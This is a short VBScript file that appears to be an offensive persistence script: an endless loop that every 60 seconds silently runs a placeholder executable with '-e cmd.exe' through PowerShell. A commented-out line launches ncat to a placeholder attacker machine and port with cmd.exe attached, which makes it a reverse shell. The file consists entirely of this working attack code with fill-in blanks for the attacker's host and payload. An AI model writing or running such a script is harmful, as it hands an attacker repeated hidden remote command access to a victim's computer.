' Dim ncShell2
' Set ncShell2 = WScript.CreateObject("WScript.shell")
Dim ncShell
Set ncShell = WScript.CreateObject("WScript.shell")

Do while True:
	' ncShell2.Run "powershell.exe C:\temp\ncat.exe [YOUR ATTACKER MACHINE] [YOUR PORT] -e cmd.exe", 0, true
	' WScript.Sleep(60000)
	ncShell.Run "powershell.exe C:\temp\[YOUR EXECUTABLE FILENAME HERE] -e cmd.exe", 0, true
	WScript.Sleep(60000)
loop
